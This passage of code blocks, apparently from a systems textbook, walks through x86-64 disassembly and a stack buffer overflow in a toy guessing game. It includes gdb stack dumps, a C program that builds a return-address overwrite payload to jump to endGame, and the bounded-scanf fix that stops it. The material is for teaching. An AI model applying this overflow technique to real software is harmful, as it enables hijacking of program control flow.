-0x8(%rbp),%rax        # copy s to %rax\n\n0x4006eb <+65>: mov   -0x14(%rbp),%edx       # copy ag to %edx\n\n0x4006ee <+68>: mov   %edx,0x40(%rax)        # copy ag to %rax+0x40 (s->age)\n\n0x4006f1 <+71>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006f5 <+75>: movss -0x1c(%rbp),%xmm0      # copy g to %xmm0\n\n0x4006fa <+80>: movss %xmm0,0x48(%rax)       # copy g to %rax+0x48\n\n0x400700 <+86>: leaveq                       # prepare stack to exit function\n\n0x400701 <+87>: retq                         # return (void func, %rax ignored)\n```", "```\n0x4006b2 <+8>:  mov   %rdi,-0x8(%rbp)        # copy 1st param to %rbp-0x8 (s)\n\n0x4006b6 <+12>: mov   %rsi,-0x10(%rbp)       # copy 2nd param to %rpb-0x10 (nm)\n\n0x4006ba <+16>: mov   %edx,-0x14(%rbp)       # copy 3rd param to %rbp-0x14 (ag)\n\n0x4006bd <+19>: mov   %ecx,-0x18(%rbp)       # copy 4th param to %rbp-0x18 (gr)\n\n0x4006c0 <+22>: movss %xmm0,-0x1c(%rbp)      # copy 5th param to %rbp-0x1c (g)\n\n0x4006c5 <+27>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006c9 <+31>: mov   -0x10(%rbp),%rcx       # copy nm to %rcx\n\n0x4006cd <+35>: mov   $0x40,%edx             # copy 0x40 (or 64) to %edx\n\n0x4006d2 <+40>: mov   %rcx,%rsi              # copy nm to %rsi\n\n0x4006d5 <+43>: mov   %rax,%rdi              # copy s to %rdi\n\n0x4006d8 <+46>: callq 0x400460 <strncpy@plt> #call strcnpy(s->name, nm, 64)\n```", "```\n0x4006dd <+51>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006e1 <+55>: mov   -0x18(%rbp),%edx       # copy gr to %edx\n\n0x4006e4 <+58>: mov   %edx,0x44(%rax)        # copy gr to %rax+0x44 (s->grad_yr)\n```", "```\n0x4006e7 <+61>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006eb <+65>: mov   -0x14(%rbp),%edx       # copy ag to %edx\n\n0x4006ee <+68>: mov   %edx,0x40(%rax)        # copy ag to %rax+0x40 (s->age)\n```", "```\n0x4006f1 <+71>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006f5 <+75>: movss -0x1c(%rbp),%xmm0      # copy g to %xmm0\n\n0x4006fa <+80>: movss %xmm0,0x48(%rax)       # copy g to %rax+0x48\n```", "```\nstruct studentTM {\n\n    char name[63]; //updated to 63 instead of 64\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n};\n\nstruct studentTM student2;\n```", "```\nstruct studentTM {\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n    char name[63];\n\n};\n\nstruct studentTM student3;\n```", "```\n$ tar -xzvf secretx86-64.tar.gz\n```", "```\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include \"other.h\" //contains secret function definitions\n\n/*prints out the You Win! message*/\n\nvoid endGame(void) {\n\n    printf(\"You win!\\n\");\n\n    exit(0);\n\n}\n\n/*main function of the game*/\n\nint main() {\n\n    int guess, secret, len, x=3\n\n    char buf[12]; //buffer (12 bytes long)\n\n    printf(\"Enter secret number:\\n\");\n\n    scanf(\"%s\", buf); //read guess from user input\n\n    guess = atoi(buf); //convert to an integer\n\n    secret = getSecretCode(); //call the getSecretCode function\n\n    //check to see if guess is correct\n\n    if (guess == secret) {\n\n        printf(\"You got it right!\\n\");\n\n    }\n\n    else {\n\n        printf(\"You are so wrong!\\n\");\n\n        return 1; //if incorrect, exit\n\n    }\n\n    printf(\"Enter the secret string to win:\\n\");\n\n    scanf(\"%s\", buf); //get secret string from user input\n\n    guess = calculateValue(buf, strlen(buf)); //call calculateValue function\n\n    //check to see if guess is correct\n\n    if (guess != secret) {\n\n        printf(\"You lose!\\n\");\n\n        return 2; //if guess is wrong, exit\n\n    }\n\n    /*if both the secret string and number are correct\n\n    call endGame()*/\n\n    endGame();\n\n    return 0;\n\n}\n```", "```\n   0x00000000004006f2 <+0>:   push   %rbp\n\n   0x00000000004006f3 <+1>:   mov    %rsp,%rbp\n\n   0x00000000004006f6 <+4>:   sub    $0x20,%rsp\n\n   0x00000000004006fa <+8>:   movl   $0x3,-0x4(%rbp)\n\n   0x0000000000400701 <+15>:  mov    $0x400873,%edi\n\n   0x0000000000400706 <+20>:  callq  0x400500 <printf@plt>\n\n   0x000000000040070b <+25>:  lea    -0x20(%rbp),%rax\n\n   0x000000000040070f <+29>:  mov    %rax,%rsi\n\n   0x0000000000400712 <+32>:  mov    $0x400888,%edi\n\n=> 0x0000000000400717 <+37>:  mov    $0x0,%eax\n\n   0x000000000040071c <+42>:  callq  0x400540 <scanf@plt>\n```", "```\n(gdb) x /48bx $rsp\n```", "```\n(gdb) x /48bx $rsp\n\n0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38\n\n0x7fffffffdcf8: 0x39  0x30  0x00  0x00  0x00  0x00  0x00  0x00\n\n0x7fffffffdd00: 0xf0  0xdd  0xff  0xff  0xff  0x7f  0x00  0x00\n\n0x7fffffffdd08: 0x00  0x00  0x00  0x00  0x03  0x00  0x00  0x00\n\n0x7fffffffdd10: 0xd0  0x07  0x40  0x00  0x00  0x00  0x00  0x00\n\n0x7fffffffdd18: 0x30  0xd8  0xa2  0xf7  0xff  0x7f  0x00  0x00\n```", "```\n0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38\n\n0x7fffffffdcf8: 0x39  0x30  0x00  0x00  0x00  0x00  0x00  0x00\n```", "```\n$ ./secret\n\nEnter secret number:\n\n1234567890\n\nYou are so wrong!\n\n$ echo $?\n\n1\n```", "```\n$ ./secret\n\nEnter secret number:\n\n1234567890123456789012345678901234567890123\n\nYou are so wrong!\n\nSegmentation fault (core dumped)\n\n$ echo $?\n\n139\n```", "```\n$ gdb secret\n\n(gdb) break *0x0000000000400717\n\n(gdb) run < input.txt\n\n(gdb) ni\n\n(gdb) x /48bx $rsp\n\n0x7fffffffdcf0: 0x31  0x32  0x33  0x34  0x35  0x36  0x37  0x38\n\n0x7fffffffdcf8: 0x39  0x30  0x31  0x32  0x33  0x34  0x35  0x36\n\n0x7fffffffdd00: 0x37  0x38  0x39  0x30  0x31  0x32  0x33  0x34\n\n0x7fffffffdd08: 0x35  0x36  0x37  0x38  0x39  0x30  0x31  0x32\n\n0x7fffffffdd10: 0x33  0x34  0x35  0x36  0x37  0x38  0x39  0x30\n\n0x7fffffffdd18: 0x31  0x32  0x33  0x00  0xff  0x7f  0x00  0x00\n\n(gdb) n\n\nSingle stepping until exit from function main,\n\nwhich has no line number information.\n\nYou are so wrong!\n\n0x00007fff00333231 in ?? ()\n```", "```\n$ gdb secret\n\n(gdb) disas endGame\n\nDump of assembler code for function endGame:\n\n   0x00000000004006da <+0>:   push   %rbp\n\n   0x00000000004006db <+1>:   mov    %rsp,%rbp\n\n   0x00000000004006de <+4>:   mov    $0x40086a,%edi\n\n   0x00000000004006e3 <+9>:   callq  0x400500 <puts@plt>\n\n   0x00000000004006e8 <+14>:  mov    $0x0,%edi\n\n   0x00000000004006ed <+19>:  callq  0x400550 <exit@plt>\n\nEnd of assembler dump.\n```", "```\n#include <stdio.h>\n\nchar ebuff[]=\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*first 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*next 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*following 10 bytes of junk*/\n\n\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x30\" /*last 10 bytes of junk*/\n\n\"\\xda\\x06\\x40\\x00\\x00\\x00\\x00\\x00\" /*address of endGame (little endian)*/\n\n;\n\nint main(void) {\n\n    int i;\n\n    for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/\n\n        printf(\"%c\", ebuff[i]);\n\n    }\n\n    return 0;\n\n}\n```", "```\n$ gcc -o genEx genEx.c\n\n$ ./genEx > exploit\n```", "```\n$ ./secret < exploit\n\nEnter secret number:\n\nYou are so wrong!\n\nYou win!\n```", "```\n$ echo $?\n\n0\n```", "```\n#include <stdio.h>\n\n#include <stdlib.h>\n\n#include \"other.h\" //contain secret function definitions\n\n/*prints out the You Win! message*/\n\nvoid endGame(void) {\n\n    printf(\"You win!\\n\");\n\n    exit(0);\n\n}\n\n/*main function of the game*/\n\nint main() {\n\n    int guess, secret, len, x=3\n\n    char buf[12]; //buffer (12 bytes long)\n\n    printf(\"Enter secret number:\\n\");\n\n    scanf(\"%12s\", buf); //read guess from user input (fixed!)\n\n    guess = atoi(buf); //convert to an integer\n\n    secret=getSecretCode(); //call the getSecretCode function\n\n    //check to see if guess is correct\n\n    if (guess == secret) {\n\n        printf(\"You got it right!\\n\");\n\n    }\n\n    else {\n\n        printf(\"You are so wrong!\\n\");\n\n        return 1; //if incorrect, exit\n\n    }\n\n    printf(\"Enter the secret string to win:\\n\");\n\n    scanf(\"%12s\", buf); //get secret string from user input (fixed!)\n\n    guess = calculateValue(buf, strlen(buf)); //call calculateValue function\n\n    //check to see if guess is correct\n\n    if (guess != secret) {\n\n        printf(\"You lose!\\n\");\n\n        return 2; //if guess is wrong, exit\n\n    }\n\n    /*if both the secret string and number are correct\n\n    call endGame()*/\n\n    endGame();\n\n    return 0;\n\n}\n```", "```\n$ ./secret2 < exploit\n\nEnter secret number:\n\nYou are so wrong!\n\n$ echo $?\n\n1\n```"]